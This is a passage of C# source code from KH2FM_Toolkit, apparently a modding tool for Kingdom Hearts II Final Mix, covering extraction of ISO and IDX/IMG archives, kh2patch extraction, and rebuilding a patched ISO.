using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using GovanifY.Utility;
using HashList;
using IDX_Tools;
using ISO_Tools;
using KH2FM_Toolkit.Properties;
using KHCompress;
using System.Linq;
using Microsoft.Win32;
using System.Net;
using System.Threading;


namespace KH2FM_Toolkit

{
	public static class Program
	{
		/// <summary>
		///     <para>Sector size of the ISO</para>
		///     <para>Almost always 2048 bytes</para>
		/// </summary>
		public const int SectorSize = 2048;

		public static readonly FileVersionInfo program =
			FileVersionInfo.GetVersionInfo(Assembly.GetEntryAssembly().Location);

		private static readonly PatchManager Patches = new PatchManager();
		private static bool _advanced = false;
		#if KH2PATCH_EXTRACTOR
		private static bool k2e = true;
		#else
		private static bool k2e = false;
		#endif

		#if KH2CONVERT_PATCH
		private static bool convertpatch = true;
		#else
		private static bool convertpatch = false;
		#endif
		private static bool oldui = true;

		#if RELEASE
		private static bool UISwitch = false;
		#else
		private static bool UISwitch = true;
		#endif

		#if REPLACER
		private static bool Replacer = true;
		#else
		private static bool Replacer = false;
		#endif

		public static string ActualVersion="PRE-3.0";
		//Have to be at least 2 diff otherwise auto build will fail!
		//Also blacklist NEEDS to be before retail.
		#if BLACKLIST
		private static string build="19";
		#else
		private static string build="21";
		#endif
		public static void WriteWarning(string format, params object[] arg)
		{
			Console.ForegroundColor = ConsoleColor.Red;
			Console.WriteLine(format, arg);
			Console.ResetColor();
		}

		public static void WriteError(string format, params object[] arg)
		{
			WriteWarning(format, arg);
			//Let the user see the error
			Console.Write(@"Press enter to continue anyway... ");
			Console.ReadLine();
		}

		/// <param name="idx">Left open.</param>
		/// <param name="img">Left open.</param>
		/// <param name="recurse">recursive</param>
		/// <param name="tfolder">Complete name</param>
		/// <param name="name">Complete name</param>
		#if !RELEASE
		private static void ExtractIDX(IDXFile idx, Stream img, ConsoleProgress progress, bool recurse = false,string tfolder = "export/",
			string name = "")
		{
			using (var imgf = new IMGFile(img, leaveOpen: true))
			{
				var idxs = new List<Tuple<IDXFile, string>>();
				uint i = 0, total = idx.Count;
				progress.Total += total;
				foreach (IDXFile.IDXEntry entry in idx)
				{
					string filename = entry.FileName();
					if (recurse)
					{
						switch (entry.Hash)
						{
						case 0x0499386d: //000hb.idx
						case 0x0b2025ed: //000mu.idx
						case 0x2b87c9dc: //000di.idx
						case 0x2bb6ecb2: //000ca.idx
						case 0x35f6154a: //000al.idx
						case 0x3604eeef: //000tt.idx
						case 0x43887a92: //000po.idx
						case 0x4edb9e9e: //000gumi.idx
						case 0x608e02b4: //000es.idx
						case 0x60dd6d06: //000lk.idx
						case 0x79a2a329: //000eh.idx
						case 0x84eaa276: //000tr.idx
						case 0x904a97e0: //000wm.idx
						case 0xb0be1463: //000wi.idx
						case 0xd233219f: //000lm.idx
						case 0xe4633b6f: //000nm.idx
						case 0xeb89495d: //000bb.idx
						case 0xf87401c0: //000dc.idx
						case 0xff7a1379: //000he.idx
							idxs.Add(new Tuple<IDXFile, string>(new IDXFile(imgf.GetFileStream(entry)),
								Path.GetFileNameWithoutExtension(filename).Substring(3)));
							Debug.WriteLine("  Added IDX to list");
							break;
						}
					}
					if (_advanced)
					{
						if (name == "KH2")
						{
							Console.WriteLine("-----------File {0,4}/{1}, using {2}.IDX\n", ++i, total, name);
						}
						else
						{
							if (name == "OVL")
							{
								Console.WriteLine("-----------File {0,4}/{1}, using {2}.IDX\n", ++i, total, name);
							}
							else
							{
								Console.WriteLine("-----------File {0,4}/{1}, using 000{2}.idx\n", ++i, total, name);
							}
						}
						Console.WriteLine("Dual Hash flag: {0}", entry.IsDualHash); //Always false but anyways
						Console.WriteLine("Hashed filename: {0}\nHashAlt: {1}", entry.Hash, entry.HashAlt);
						Console.WriteLine("Compression flags: {0}", entry.IsCompressed);
						Console.WriteLine("Size (packed): {0}", entry.CompressedDataLength);
						Console.WriteLine("Real name: {0}", filename);
					}
					else
					{
						if(oldui)
						{
							Console.WriteLine("[{2}: {0,4}/{1}]\tExtracting {3}", ++i, total, name, filename);
						}
						else
						{
							if (progress != null)
							{
								if (UISwitch)
								{
									progress.Text = string.Format("Extracting [{0}] {1}", name, filename);
								}
								else
								{
									decimal nmbpercent = (((decimal)progress.Current / (decimal)progress.Total) * 100);
									progress.Text = string.Format("                                [{0}% Done]", (int)nmbpercent);
								}
								progress.Increment(1L);
							}
						}

					}
					filename = Path.GetFullPath(tfolder + filename);
					Directory.CreateDirectory(Path.GetDirectoryName(filename));
					using (var output = new FileStream(filename, FileMode.Create, FileAccess.ReadWrite, FileShare.None))
					{
						bool adSize = _advanced;
						imgf.ReadFile(entry, output, adSize);
					}
				}
				if (recurse && idxs.Count != 0)
				{
					foreach (var sidx in idxs)
					{
						ExtractIDX(sidx.Item1, img, progress, false, tfolder, sidx.Item2);
					}
				}
			}
		}
		private static void KH2PATCHInternal(Substream KH2PFileStream, string fname2, bool Compressed,
		UInt32 UncompressedSize)
		{
		fname2 = "output/" + fname2;
		try
		{
		Directory.CreateDirectory(Path.GetDirectoryName(fname2));
		}
		catch
		{
		} //Creating folder
		FileStream fileStream = File.Create(fname2);
		var buffer = new byte[KH2PFileStream.Length];
		var buffer2 = new byte[UncompressedSize];
		var file3 = new MemoryStream();
		if (Compressed)
		{
		KH2PFileStream.CopyTo(file3);
		buffer = file3.ToArray();
		buffer2 = KH2Compressor.decompress(buffer, UncompressedSize);
		// Will crash if the byte array is equal to void.
		file3 = new MemoryStream(buffer2);
		}
		else
		{
		KH2PFileStream.CopyTo(file3);
		buffer2 = file3.ToArray();
		file3 = new MemoryStream(buffer2);
		}
		file3.CopyTo(fileStream);
		fileStream.Close();
		Console.WriteLine("Done!");
		}

		private static void KH2PatchExtractor(Stream patch, string outputname)
		{
		try
		{
		Directory.CreateDirectory(Path.GetDirectoryName("output/"));
		}
		catch
		{
		} //Creating folder
		using (var br = new BinaryStream(patch, Encoding.ASCII, leaveOpen: true))
		{
		using (TextWriter op = new StreamWriter("output/log.log"))
		{
		uint tmp = br.ReadUInt32();
		if (tmp != 1345472587u && tmp != 1362249803u)
		{
		br.Close();
		br.Close();
		throw new InvalidDataException("Invalid KH2Patch file!");
		}
		uint oaAuther = br.ReadUInt32(),
		obFileCount = br.ReadUInt32(),
		num = br.ReadUInt32();
		string patchname = "";
		patchname = Path.GetFileName(patchname);
		try
		{
		string author = br.ReadCString();
		op.WriteLine(author);
		op.WriteLine(num);
		Console.ForegroundColor = ConsoleColor.Cyan;
		Console.WriteLine("Loading patch {0} version {1} by {2}", patchname, num, author);
		Console.ResetColor();
		br.Seek(oaAuther, SeekOrigin.Begin);
		uint os1 = br.ReadUInt32(),
		os2 = br.ReadUInt32(),
		os3 = br.ReadUInt32();
		br.Seek(oaAuther + os1, SeekOrigin.Begin);
		num = br.ReadUInt32();
		if (num > 0)
		{
		br.Seek(num * 4, SeekOrigin.Current);
		//Console.WriteLine("Changelog:");
		Console.ForegroundColor = ConsoleColor.Green;
		while (num > 0)
		{
		--num;
		op.WriteLine(br.ReadCString());
		//Console.WriteLine(" * {0}", br.ReadCString());
		}
		op.WriteLine("");
		}
		br.Seek(oaAuther + os2, SeekOrigin.Begin);
		num = br.ReadUInt32();
		if (num > 0)
		{
		br.Seek(num * 4, SeekOrigin.Current);
		Console.ResetColor();
		//Console.WriteLine("Credits:");
		Console.ForegroundColor = ConsoleColor.Green;
		while (num > 0)
		{
		--num;
		op.WriteLine(br.ReadCString());
		//Console.WriteLine(" * {0}", br.ReadCString());
		}
		op.WriteLine("");
		Console.ResetColor();
		}
		br.Seek(oaAuther + os3, SeekOrigin.Begin);
		author = br.ReadCString();
		/*author = author.Replace("\r\n", string.Empty);
		author = author.Replace("\n", string.Empty);//Shitty but I know someone who made mods for adding more than one line...*/
		if (author.Length != 0)
		{
		// Console.WriteLine("Other information:\r\n");
		Console.ForegroundColor = ConsoleColor.Green;
		op.WriteLine(author);
		//Console.WriteLine("{0}", author);
		}
		op.WriteLine("");
		Console.ResetColor();
		}
		catch (Exception e)
		{
		Console.ForegroundColor = ConsoleColor.Red;
		Console.WriteLine("Error reading kh2patch header: {0}: {1}\r\nAttempting to continue files...",
		e.GetType(), e.Message);
		Console.ResetColor();
		}
		Console.WriteLine("");
		br.Seek(obFileCount, SeekOrigin.Begin);
		num = br.ReadUInt32();
		while (num > 0)
		{
		--num;
		uint Hash = br.ReadUInt32();
		oaAuther = br.ReadUInt32();
		uint CompressedSize = br.ReadUInt32();
		uint UncompressedSize = br.ReadUInt32();
		uint Parent = br.ReadUInt32();
		uint Relink = br.ReadUInt32();
		bool Compressed = br.ReadUInt32() != 0;
		bool IsNew = br.ReadUInt32() == 1; //Custom

		string fname3 = "";

		string fname2;
		if (Relink == 0)
		{
		if (CompressedSize != 0)
		{
		var KH2PFileStream = new Substream(patch, oaAuther, CompressedSize);
		if (HashList.HashList.pairs.TryGetValue(Hash, out fname2)) { Console.Write("Extracting {0}...", fname2); }
		else
		{ fname2 = String.Format("@noname/{0:X8}.bin", Hash); ; Console.Write("Extracting {0}...", fname2); }
		long brpos = br.Tell();
		KH2PATCHInternal(KH2PFileStream, fname2, Compressed, UncompressedSize);
		br.ChangePosition((int)brpos);
		//Changing the original position of the BinaryReader for what's next
		}
		else
		{
		throw new InvalidDataException("File length is 0, but not relinking.");
		}

		op.WriteLine(fname2);
		op.WriteLine(fname3);
		string Compressed2 = "";
		if (Compressed) { Compressed2 = "y"; } else { Compressed2 = "n"; }
		op.WriteLine(Compressed2);
		string Parent2 = "";
		if (Parent == 0) { }
		if (Parent == 1) { Parent2 = "OVL"; }
		if (Parent == 2) { Parent2 = "ISO"; }
		op.WriteLine(Parent2);
		string IsNew2 = "";
		if (IsNew) { IsNew2 = "y"; } else { IsNew2 = "n"; }
		op.WriteLine(IsNew2);
		}
		else
		{
		if (!HashList.HashList.pairs.TryGetValue(Hash, out fname2)) { fname2 = String.Format("@noname/{0:X8}.bin", Hash); }
		if (!HashList.HashList.pairs.TryGetValue(Relink, out fname3))
		{
		fname3 = String.Format("@noname/{0:X8}.bin", Relink);
		}
		Console.WriteLine("File {1} relinked to {0}, no need to extract", fname3, fname2);

		op.WriteLine(fname2);
		op.WriteLine(fname3);
		string Parent2 = "";
		if (Parent == 0) { }
		if (Parent == 1) { Parent2 = "OVL"; }
		if (Parent == 2) { Parent2 = "ISO"; }
		op.WriteLine(Parent2);
		string IsNew2 = "";
		if (IsNew) { IsNew2 = "y"; } else { IsNew2 = "n"; }
		op.WriteLine(IsNew2);
		}

		br.Seek(60, SeekOrigin.Current);
		}
		op.WriteLine("");
		using (TextWriter bat = new StreamWriter("output/output.bat"))
		{
		bat.WriteLine("@echo off");
		bat.WriteLine("KH2FM_Toolkit.exe -patchmaker -batch -uselog log.log -output \"{0}\"", outputname);
		}
		File.Copy(System.Reflection.Assembly.GetEntryAssembly().Location, "output/KH2FM_Toolkit.exe");
		}
		} //End of br
		}
		private static void KH2PatchConvertor(Stream patch, string outputname)
		{
		Console.WriteLine("Processing the patch, please wait...");
		byte[] data;
		using (var ms = new MemoryStream())
		{
		patch.CopyTo(ms);
		data = ms.ToArray();
		}
		File.WriteAllBytes(outputname + ".NEW.kh2patch", data);
		Console.WriteLine("Done!");
		}

		private static void ExtractISO(Stream isofile, string tfolder = "export/")
		{

			if (oldui)
			{
				using (var iso = new ISOFileReader(isofile))
				{
					var idxs = new List<IDXFile>();
					var idxnames = new List<string>();
					int i = 0;
					foreach (FileDescriptor file in iso)
					{
						++i;
						string filename = file.FullName;
						if (filename.EndsWith(".IDX"))
						{
							idxs.Add(new IDXFile(iso.GetFileStream(file)));
							idxnames.Add(Path.GetFileNameWithoutExtension(filename));
							//continue;
							//Write the IDX too
						}
						else if (filename.EndsWith(".IMG") && idxnames.Contains(Path.GetFileNameWithoutExtension(filename)))
						{
							continue;
						}
						Console.WriteLine("[ISO: {0,3}]\tExtracting {1}", i, filename);
						filename = Path.GetFullPath(tfolder + "ISO/" + filename);
						try
						{
							Directory.CreateDirectory(Path.GetDirectoryName(filename));
						}
						catch (IOException e)
						{
							WriteError("Failed creating directory: {0}", e.Message);
							continue;
						}
						using (var output = new FileStream(filename, FileMode.Create, FileAccess.ReadWrite, FileShare.None))
						{
							iso.CopyFile(file, output);
						}
					}
					for (i = 0; i < idxs.Count; ++i)
					{
						try
						{
							FileDescriptor file = iso.FindFile(idxnames[i] + ".IMG");
							using (Substream img = iso.GetFileStream(file))
							{
								ConsoleProgress consoleProgress = new ConsoleProgress(1L, null, ConsoleColor.Green, false);
								ExtractIDX(idxs[i], img, consoleProgress,true,tfolder + "" + idxnames[i] + "/", idxnames[i]);
							}
						}
						catch (FileNotFoundException)
						{
							WriteError("ERROR: Failed to find matching IMG for IDX");
						}
					}
				}
			}
			else
			{
				ConsoleProgress consoleProgress = new ConsoleProgress(1L, null, ConsoleColor.Green);
				Dictionary<string, IDXFile> dictionary = new Dictionary<string, IDXFile>();
				using (var iso = new ISOFileReader(isofile))
				{
					var idxs = new List<IDXFile>();
					var idxnames = new List<string>();
					int i = 0;
					foreach (FileDescriptor file in iso)
					{
						++i;
						string filename = file.FullName;
						if (filename.EndsWith(".IDX"))
						{
							idxs.Add(new IDXFile(iso.GetFileStream(file)));
							idxnames.Add(Path.GetFileNameWithoutExtension(filename));
							//continue;
							//Write the IDX too
						}
						else if (filename.EndsWith(".IMG") && idxnames.Contains(Path.GetFileNameWithoutExtension(filename)))
						{
							continue;
						}
						if (UISwitch)
						{
							consoleProgress.Text = string.Format("Extracting [{0}] {1}", "ISO", filename);
						}
						else
						{
							decimal nmbpercent = (((decimal)consoleProgress.Current / (decimal)consoleProgress.Total) * 100);
							consoleProgress.Text = string.Format("                                [{0}% Done]", (int)nmbpercent);
						}
						long total;
						consoleProgress.Total = (total = consoleProgress.Total) + 1L;
						consoleProgress.Update(total);
						filename = Path.GetFullPath(tfolder + "ISO/" + filename);
						try
						{
							Directory.CreateDirectory(Path.GetDirectoryName(filename));
						}
						catch (IOException e)
						{
							consoleProgress.Color = ConsoleColor.DarkRed;
							consoleProgress.ReDraw();
							WriteError("Failed creating directory: {0}", e.Message);
							continue;
						}
						using (var output = new FileStream(filename, FileMode.Create, FileAccess.ReadWrite, FileShare.None))
						{
							iso.CopyFile(file, output);
						}
					}
					consoleProgress.Total += dictionary.Sum((KeyValuePair<string, IDXFile> kvp) => (long)((ulong)kvp.Value.Count));
					for (i = 0; i < idxs.Count; ++i)
					{
						try
						{
							FileDescriptor file = iso.FindFile(idxnames[i] + ".IMG");
							using (Substream img = iso.GetFileStream(file))
							{
								ExtractIDX(idxs[i], img, consoleProgress , true, tfolder + "" + idxnames[i] + "/", idxnames[i]);
							}
						}
						catch (FileNotFoundException)
						{
							consoleProgress.Color = ConsoleColor.DarkRed;
							consoleProgress.ReDraw();
							WriteError("ERROR: Failed to find matching IMG for IDX");
						}
					}
					consoleProgress.Text = "Done extracting.";
					consoleProgress.Finish();
				}
			}
		}
		#endif

		/// <param name="sidx">Stream of the original idx.</param>
		/// <param name="simg">Stream of the original img.</param>
		/// <param name="timg">img of the new iso.</param>
		/// <param name="imgOffset">Offset of the new img in the new iso.</param>
		/// <param name="parenthash">Parent Hash(KH2 or OVL or 000's)</param>
		private static MemoryStream PatchIDXInternal(Stream sidx, Stream simg, Stream timg, long imgOffset,ConsoleProgress progress,
			uint parenthash = 0)
		{
			//Generate Parent name
			string parentname;
			if (parenthash == 0)
			{
				parentname = "KH2";
			}
			else if (parenthash == 1)
			{
				parentname = "OVL";
			}
			#if !RELEASE
			else if (HashList.HashList.pairs.TryGetValue(parenthash, out parentname))
			{
				parentname = parentname.Substring(3, parentname.IndexOf('.') - 3);
			}
			else
			{
				parentname = parenthash.ToString("X8");
			}
			#else
			parentname = parenthash.ToString("X8");
			#endif
			//Need more using
			using (var idx = new IDXFile(sidx, leaveOpen: true))
			using (var img = new IMGFile(simg, leaveOpen: true))
			using (var npair = new IDXIMGWriter(timg, imgOffset, true))
			{
				progress.Total += (long)((ulong)idx.Count);
				uint i = 0, total = idx.Count;
				foreach (IDXFile.IDXEntry file in idx)
				{
					if (oldui)
					{
						if (UISwitch)
						{
						   Console.Write("[{0}: {1,4}/{2}]\t{3}", parentname, ++i, total, file.FileName());
						}
						else
						{
						   Console.Write("[{0}: {1,4}/{2}]\t{3}", parentname, ++i, total, file.Hash.ToString("X8"));
						}
					}
					else
					{
						if (UISwitch)
						{
							progress.Text = string.Format("Adding [{0}] {1}", parentname, file.FileName());
						}
						else
						{
							decimal nmbpercent = (((decimal)progress.Current / (decimal)progress.Total) * 100);
							progress.Text = string.Format("                                [{0}% Done]", (int)nmbpercent);
						}
						progress.Increment(1L);
					}
					switch (file.Hash)
					{
					case 0x0499386d: //000hb.idx
					case 0x0b2025ed: //000mu.idx
					case 0x2b87c9dc: //000di.idx
					case 0x2bb6ecb2: //000ca.idx
					case 0x35f6154a: //000al.idx
					case 0x3604eeef: //000tt.idx
					case 0x43887a92: //000po.idx
					case 0x4edb9e9e: //000gumi.idx
					case 0x608e02b4: //000es.idx
					case 0x60dd6d06: //000lk.idx
					case 0x79a2a329: //000eh.idx
					case 0x84eaa276: //000tr.idx
					case 0x904a97e0: //000wm.idx
					case 0xb0be1463: //000wi.idx
					case 0xd233219f: //000lm.idx
					case 0xe4633b6f: //000nm.idx
					case 0xeb89495d: //000bb.idx
					case 0xf87401c0: //000dc.idx
					case 0xff7a1379: //000he.idx
						if (oldui) { Console.WriteLine("\tRe-Building..."); }
						using (Substream oidx = img.GetFileStream(file))
						using (MemoryStream subidx = PatchIDXInternal(oidx, simg, timg, imgOffset, progress, file.Hash))
						{
							npair.AddFile(new IDXFile.IDXEntry
								{
									Hash = file.Hash,
									HashAlt = file.HashAlt,
									IsDualHash = file.IsDualHash,
									DataLength = (uint) subidx.Length,
									IsCompressed = false,
									CompressedDataLength = (uint) subidx.Length
								}, subidx);
						}
						continue;
					}
					PatchManager.Patch patch;
					// Could make sure the parents match perfectly, but there's only 1 of every name anyway.
					// So I'll settle for just making sure the file isn't made for the ISO.
					if (Patches.patches.TryGetValue(file.Hash, out patch) && /*patch.Parent == parenthash*/
						!patch.IsinISO)
					{
						patch.IsNew = false;
						if (patch.IsRelink)
						{
							try
							{
								npair.RelinkFile(file.Hash, patch.Relink);
								if (oldui) { Console.WriteLine("\tRelinking..."); }
							}
							catch
							{
								progress.Total -= 1L;
								if (oldui) { Console.WriteLine("\tDeferred Relinking..."); }
								// Add the patch to be processed later, in the new file block
								patch.Parent = parenthash;
								Patches.AddToNewFiles(patch);
							}
							continue;
						}
						if (oldui) { Console.WriteLine("\tPatching..."); }
						#if extract
						Console.WriteLine("\nEXTRACTING THE FILE!");
						Console.WriteLine("\nGetting the name...");
						string fname2;
						HashList.HashList.pairs.TryGetValue(file.Hash, out fname2);
						Console.WriteLine("\nCreating directory...");
						try
						{
						Directory.CreateDirectory(Path.GetDirectoryName(fname2));
						}
						catch
						{
						Console.WriteLine("\nDirectory is surely null. Trying to create the file anyways...");
						}
						Console.WriteLine("\nCreating the file...");
						FileStream fileStream = File.Create(fname2);
						Console.WriteLine("\nConverting the stream to a byte[]...");
						patch.Stream.Position = 0;
						var buffer = new byte[patch.Stream.Length];
						for (int totalBytesCopied = 0; totalBytesCopied < patch.Stream.Length;)
						totalBytesCopied += patch.Stream.Read(buffer, totalBytesCopied,
						Convert.ToInt32(patch.Stream.Length) - totalBytesCopied);
						Console.WriteLine("\nConverting the int to uint...");
						byte[] file2;
						if (patch.Compressed)
						{
						Console.WriteLine("\nThe file is compressed!");
						Console.WriteLine("\nDecompressing the file...");
						file2 = KH2Compressor.decompress(buffer, patch.UncompressedSize);
						}
						else
						{
						file2 = buffer;
						}
						Console.WriteLine("\nOpening the stream for the file..");
						Stream decompressed = new MemoryStream(file2);
						Console.WriteLine("\nCopying the Stream...");
						decompressed.CopyTo(fileStream);
						Console.WriteLine("\nDone!...");
						#endif
						try
						{
							npair.AddFile(new IDXFile.IDXEntry
								{
									Hash = file.Hash,
									HashAlt = file.HashAlt,
									IsDualHash = file.IsDualHash,
									DataLength = patch.UncompressedSize,
									IsCompressed = patch.Compressed,
									CompressedDataLength = patch.CompressedSize
								}, patch.Stream);
							continue;
						}
						catch (Exception e)
						{
							WriteError(" ERROR Patching: " + e.Message);
							#if DEBUG
							WriteError(e.StackTrace);
							#endif
						}
					}
					if (oldui) { Console.WriteLine(""); }
					npair.AddFile(file, img.GetFileStream(file));
				}
				//Check for new files to add
				List<uint> newfiles;
				if (Patches.newfiles.TryGetValue(parenthash, out newfiles))
				{
					progress.Total += (long)newfiles.Count;
					foreach (uint hash in newfiles)
					{
						PatchManager.Patch patch;
						if (Patches.patches.TryGetValue(hash, out patch) && patch.IsNew)
						{
							patch.IsNew = false;
							string fname;
							#if !RELEASE
							if (!HashList.HashList.pairs.TryGetValue(hash, out fname))
							{
								fname = String.Format("@noname/{0:X8}.bin", hash);
							}
							#else
							fname = String.Format("@noname/{0:X8}.bin", hash);
							#endif
							if (oldui)
							{
								Console.Write("[{0}: NEW]\t{1}", parentname, fname);
							}
							else
							{
								if (UISwitch)
								{
									progress.Text = string.Format("Adding [{0} : NEW] {1}", parentname, fname);
								}
								else
								{
									decimal nmbpercent = (((decimal)progress.Current / (decimal)progress.Total) * 100);
									progress.Text = string.Format("                                [{0}% Done]", (int)nmbpercent);
								}
								progress.Increment(1L);
							}
							try
							{
								if (patch.IsRelink)
								{
									if (oldui) { Console.WriteLine("\tAdding link..."); }
									npair.RelinkFile(hash, patch.Relink);
								}
								else
								{
									if (oldui) { Console.WriteLine("\tAdding file..."); }
									npair.AddFile(new IDXFile.IDXEntry
										{
											Hash = hash,
											HashAlt = 0,
											IsDualHash = false,
											DataLength = patch.UncompressedSize,
											IsCompressed = patch.Compressed,
											CompressedDataLength = patch.CompressedSize
										}, patch.Stream);
								}
							}
							catch (FileNotFoundException)
							{
								Console.WriteLine(" WARNING Failed to find the file to add!");
							}
							catch (Exception e)
							{
								WriteError(" ERROR adding file: {0}", e.Message);
							}
						}
					}
				}
				return npair.GetCurrentIDX();
			}
		}

		/// <param name="idx">Stream of the idx inside the iso.</param>
		/// <param name="img">Stream of the img inside the iso.</param>
		/// <param name="imgd">File descriptor of the img file.</param>
		/// <param name="niso">New ISO.</param>
		/// <param name="IsOVL">Bool which define if the OVL should be patched</param>
		private static MemoryStream PatchIDX(Stream idx, Stream img, FileDescriptor imgd, ISOCopyWriter niso,ConsoleProgress progress,
			bool IsOVL = false)
		{
			using (idx)
			using (img)
			{
				niso.SeekEnd();
				long imgOffset = niso.file.Position;
				MemoryStream idxms = PatchIDXInternal(idx, img, niso.file, imgOffset, progress, IsOVL ? 1u : 0u);
				imgd.ExtentLBA = (uint) imgOffset/2048;
				imgd.ExtentLength = (uint) (niso.file.Position - imgOffset);
				imgd.RecordingDate = DateTime.UtcNow;
				niso.PatchFile(imgd);
				niso.SeekEnd();
				return idxms;
			}
		}

		private static void ReplaceISO(Stream isofile)
		{
			var iso = new ISOFileReader (isofile);
			IDXFile KH2idx;
			IDXFile OVLidx;

			var KH2IDXName = iso.FindFile("KH2.IDX");
			var OVLIDXName = iso.FindFile("OVL.IDX");
			var KH2idxStream = iso.GetFileStream (KH2IDXName);
			var OVLidxStream = iso.GetFileStream (OVLIDXName);
			KH2idx = new IDXFile (KH2idxStream, leaveOpen: true);
			OVLidx = new IDXFile (OVLidxStream, leaveOpen: true);

			/*I need to add all sub hashes found in KH2.IMG:
			 *                         case 0x0499386d: //000hb.idx
                        case 0x0b2025ed: //000mu.idx
                        case 0x2b87c9dc: //000di.idx
                        case 0x2bb6ecb2: //000ca.idx
                        case 0x35f6154a: //000al.idx
                        case 0x3604eeef: //000tt.idx
                        case 0x43887a92: //000po.idx
                        case 0x4edb9e9e: //000gumi.idx
                        case 0x608e02b4: //000es.idx
                        case 0x60dd6d06: //000lk.idx
                        case 0x79a2a329: //000eh.idx
                        case 0x84eaa276: //000tr.idx
                        case 0x904a97e0: //000wm.idx
                        case 0xb0be1463: //000wi.idx
                        case 0xd233219f: //000lm.idx
                        case 0xe4633b6f: //000nm.idx
                        case 0xeb89495d: //000bb.idx
                        case 0xf87401c0: //000dc.idx
                        case 0xff7a1379: //000he.idx
                        */
			Console.WriteLine ("I will now list all the hashes I got in memory.");
			foreach (IDXFile.IDXEntry idx in OVLidx)
			{
				Console.WriteLine ("{0}", String.Format("{0:X8}", idx.Hash));
			}
			foreach (IDXFile.IDXEntry idx in KH2idx)
			{
				Console.WriteLine ("{0}", String.Format("{0:X8}", idx.Hash));
			}
			foreach (var PatchEntry in Patches.patches)
			{
				Console.WriteLine ("Checking for hash {0} in ISO...", String.Format("{0:X8}", PatchEntry.Value.Hash));
				try
				{
					/*KH2idx.FindEntryByHash(PatchEntry.Value.Hash);

					Console.Write("Hash found on KH2 IDX! Replacing...");
					KH2idx.file.ReadUInt32();
					KH2idx.file.ReadUInt32();//We don't care about compression flags/hashes do we?
					var IMGOffset = KH2idx.file.ReadUInt32() * 2048;

					//Such harmonious way to write new file size, isn't it? ;o WARNING: IT CRASHES
					KH2idxStream.Seek((int)KH2idxStream.Position, SeekOrigin.Begin);
						KH2idxStream.Write(PatchEntry.Value.CompressedSize);
					var KH2IMGName = iso.FindFile("KH2.IMG");
					var KH2IMGStream = iso.GetFileStream (KH2IMGName);

					KH2IMGStream.Seek(IMGOffset, SeekOrigin.Begin);

					MemoryStream ms = new MemoryStream();
						PatchEntry.Value.Stream.baseStream.CopyTo(ms);
						ms.ToArray();
					KH2IMGStream.Write(ms.ToArray(), (int)KH2IMGStream.Position, ms.ToArray().Length);*/
					Console.WriteLine ("Done!");
				}
				catch
				{
					try
					{
						/*	OVLidx.FindEntryByHash(PatchEntry.Value.Hash);

						Console.Write("Hash found on OVL IDX! Replacing...");
						OVLidx.file.ReadUInt32();
						OVLidx.file.ReadUInt32();//We don't care about compression flags/hashes do we?
						var IMGOffset = OVLidx.file.ReadUInt32() * 2048;

						OVLidxStream.Seek((int)OVLidxStream.Position, SeekOrigin.Begin);
						//Such harmonious way to write new file size, isn't it? ;o
						//OVLidxStream.Write(PatchEntry.Value.CompressedSize);
						var OVLIMGName = iso.FindFile("OVL.IMG");
						var OVLIMGStream = iso.GetFileStream (OVLIMGName);
						OVLIMGStream.Seek(IMGOffset, SeekOrigin.Begin);
						MemoryStream ms = new MemoryStream();
						PatchEntry.Value.Stream.baseStream.CopyTo(ms);
						byte[] PatchFile = ms.ToArray();
						int FileLength = PatchFile.Length;
						int offset2 = (int)OVLIMGStream.Position;
						OVLIMGStream.Write(PatchFile, offset2, FileLength);*/
					}
					catch
					{
						WriteError("No matching IDX entry were found in KH2 or OVL! Aborting replacing process...");
					}
				}

			}

		}

		/// <param name="isofile">Original ISO</param>
		/// <param name="nisofile">New ISO file</param>
		private static void PatchISO(Stream isofile, Stream nisofile)
		{
			if (oldui)
			{
				using (var iso = new ISOFileReader(isofile))
				using (var niso = new ISOCopyWriter(nisofile, iso))
				{
					uint i = 0;
					Trivalent cKh2 = Patches.KH2Changed ? Trivalent.ChangesPending : Trivalent.NoChanges,
					cOvl = Patches.OVLChanged ? Trivalent.ChangesPending : Trivalent.NoChanges;
					bool cIso = Patches.ISOChanged;
					foreach (FileDescriptor file in iso)
					{
						Console.Write("[ISO: {0,4}]\t{1}", ++i, file.FullName);
						string name = file.FileName;
						if (name.EndsWith("KH2.IDX") || name.EndsWith("KH2.IMG"))
						{
							if (cKh2.HasFlag(Trivalent.ChangesPending))
							{
								cKh2 = Trivalent.Changed;
								long lpos = niso.file.Position;
								if (oldui) { Console.WriteLine("\tRe-Building..."); }
								try
								{
									FileDescriptor img = iso.FindFile("KH2.IMG"),
									idx = iso.FindFile("KH2.IDX");
									ConsoleProgress consoleProgress = new ConsoleProgress(1L, null, ConsoleColor.Green, false);
									using (
										MemoryStream ms = PatchIDX(iso.GetFileStream(idx), iso.GetFileStream(img), img, niso, consoleProgress )
									)
									{
										idx.RecordingDate = DateTime.UtcNow;
										niso.AddFile2(idx, ms, name);
									}
									continue;
								}
								catch (Exception e)
								{
									WriteError(" Error creating IDX/IMG: {0}\n{1}", e.Message, e.StackTrace);
									niso.file.Position = lpos;
								}
							}
							else if (cKh2.HasFlag(Trivalent.Changed))
							{
								Console.WriteLine("\tRe-Built");
								continue;
							}
						}
						else if (name.EndsWith("OVL.IDX") || name.EndsWith("OVL.IMG"))
						{
							if (cOvl.HasFlag(Trivalent.ChangesPending))
							{
								cOvl = Trivalent.Changed;
								long lpos = niso.file.Position;
								Console.WriteLine("\tRe-Building...");
								try
								{
									FileDescriptor img = iso.FindFile("OVL.IMG"),
									idx = iso.FindFile("OVL.IDX");
									ConsoleProgress consoleProgress = new ConsoleProgress(1L, null, ConsoleColor.Green, false);
									using (
										MemoryStream ms = PatchIDX(iso.GetFileStream(idx), iso.GetFileStream(img), img, niso,consoleProgress, true))
									{
										idx.RecordingDate = DateTime.UtcNow;
										niso.AddFile2(idx, ms, name);
									}
									continue;
								}
								catch (Exception e)
								{
									WriteError(" Error creating IDX/IMG: " + e.Message);
									niso.file.Position = lpos;
								}
							}
							else if (cOvl.HasFlag(Trivalent.Changed))
							{
								Console.WriteLine("\tRe-Built");
								continue;
							}
						}
						else if (cIso)
						{
							PatchManager.Patch patch;
							if (Patches.patches.TryGetValue(PatchManager.ToHash(name), out patch) && patch.IsinISO)
							{
								Console.WriteLine("\tPatching...");
								file.RecordingDate = DateTime.UtcNow;
								niso.AddFile2(file, patch.Stream, name);
								continue;
							}
						}
						Console.WriteLine("");
						niso.CopyFile(file);
						if (niso.SectorCount >= 0x230540)
						{
							WriteWarning(
